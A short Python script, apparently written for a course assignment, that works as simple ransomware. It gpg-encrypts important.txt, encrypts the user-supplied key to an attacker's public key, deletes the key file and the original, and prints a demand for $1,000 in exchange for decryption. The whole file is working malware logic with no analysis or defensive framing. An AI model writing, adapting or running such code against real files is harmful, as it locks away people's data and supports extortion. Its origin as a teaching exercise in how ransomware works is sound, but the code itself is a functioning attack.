#!/usr/bin/env python3
import subprocess

# get input
key = input("Please enter a key: ")

# write
fr = open("key.txt","w")
fr.write(key)
fr.close()

# encrypt important.txt
subprocess.call("gpg -o encrypted_message.asc -c --armor important.txt",shell=True)
subprocess.call("gpgconf --reload gpg-agent",shell=True) # clear gpg passphrase or key cache

# encrypt key.txt
subprocess.call("gpg --armor --import pubkey.gpg.asc",shell=True)
subprocess.call("gpg -o encrypted_key.asc -e -r AssignmentQ4 --armor key.txt",shell=True)

# Files removal
subprocess.call("rm key.txt",shell=True)
subprocess.call("rm important.txt",shell=True)

# print message
print("Your file important.txt is encrypted. To decrypt it, you need to pay me $1,000 and send encrypted_key.asc to me.")
